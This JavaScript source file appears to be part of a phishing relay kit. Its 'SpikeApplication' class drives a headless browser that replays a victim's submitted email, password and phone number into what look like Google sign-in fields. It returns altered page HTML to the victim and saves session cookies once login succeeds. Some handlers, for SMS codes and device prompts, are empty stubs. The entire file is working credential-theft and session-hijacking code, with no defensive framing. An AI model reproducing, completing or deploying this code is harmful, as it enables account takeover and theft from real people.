const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const emailInp = `#identifierId`

                await page.waitForSelector(emailInp)
                await page.evaluate((emailInp) => {
                    document.querySelector(emailInp).value = ""
                    document.querySelector(emailInp).setAttribute("value", "")
                }, emailInp)

                await page.type(emailInp, this.email)
                await page.click('#identifierNext')
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = []

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            let ua = this.useragent
            if (this.appConfig.ua) {
                ua = this.appConfig.ua
            }

            await page.setExtraHTTPHeaders({
                "User-Agent": ua
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-email") {
                const emailInp = `#identifierId`

                await page.waitForSelector(emailInp)
                await page.evaluate((emailInp) => {
                    document.querySelector(emailInp).value = ""
                    document.querySelector(emailInp).setAttribute("value", "")
                }, emailInp)

                await page.type(emailInp, body.email)
                await page.click('#identifierNext')
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "home-password") {
                const passwordInp = `[name="Passwd"]`
                await page.waitForSelector(passwordInp)
                await page.evaluate((passwordInp) => {
                    document.querySelector(passwordInp).value = ""
                    document.querySelector(passwordInp).setAttribute("value", "")
                }, passwordInp)

                await page.type(passwordInp, body.Passwd)
                await page.click('#passwordNext')
                await page.waitForNavigation({ waitUntil: "load" })
            } else if (spikeType == "phone-number") {
                const phoneNumberInp = `#phoneNumberId`
                await page.waitForSelector(phoneNumberInp)
                await page.evaluate((phoneNumberInp) => {
                    document.querySelector(phoneNumberInp).value = ""
                    document.querySelector(phoneNumberInp).setAttribute("value", "")
                }, phoneNumberInp)

                await page.type(phoneNumberInp, body.phoneNumber)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "sms-code") {

            } else if (spikeType == "code") {

            } else if (spikeType == "auth-devices") {

            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }